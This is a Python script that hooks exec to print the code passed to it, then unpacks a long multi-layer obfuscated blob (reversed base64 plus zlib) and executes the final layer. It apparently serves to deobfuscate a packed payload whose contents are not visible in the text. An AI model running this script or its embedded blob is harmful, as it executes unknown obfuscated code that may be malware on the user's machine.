import builtins
import base64, zlib

_real_exec = builtins.exec

def dump_exec(code, *args, **kwargs):
    print("===== BEGIN DUMP =====")

    if isinstance(code, bytes):
        try:
            print(code.decode())
        except:
            print(code)
    else:
        print(code)

    print("===== END DUMP =====")

    # DO NOT exit — let nested exec fire
    return _real_exec(code, *args, **kwargs)

builtins.exec = dump_exec

_ = lambda b: zlib.decompress(base64.b64decode(b[::-1]))

data = b"=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"

while True:
    try:
        data = zlib.decompress(base64.b64decode(data[::-1]))
        print("Layer decoded, length:", len(data))
        print(data[:200])  # preview only
        print("-" * 40)
    except Exception:
        print("Final layer reached")
        exec(data)
        break
